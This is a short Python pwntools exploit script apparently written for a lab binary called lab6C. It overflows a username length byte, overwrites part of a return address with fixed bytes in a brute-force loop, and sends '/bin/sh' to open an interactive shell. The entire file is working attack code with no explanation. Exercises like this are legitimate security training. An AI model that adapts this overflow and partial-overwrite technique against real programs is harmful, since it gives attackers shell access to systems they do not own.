from pwn import *
#s = gdb.debug(["./lab6C"])
s = process(["./lab6C"])
while True:
    #s.interactive()
    name = b"a" * 40 + bytes([0xc0 + 4 + 2])
    s.sendlineafter(b"Enter your username\n", name)
    payload = b"a" * 0xc0 + b"bbbb" + b"\x2b" + b"\x77"
#s.interactive()
    s.sendlineafter(b"Tweet @Unix-Dude\n", payload)
    try:
        s.sendline(b"/bin/sh")
        s.interactive()
    except:
        s.close()
    #s.interactive()
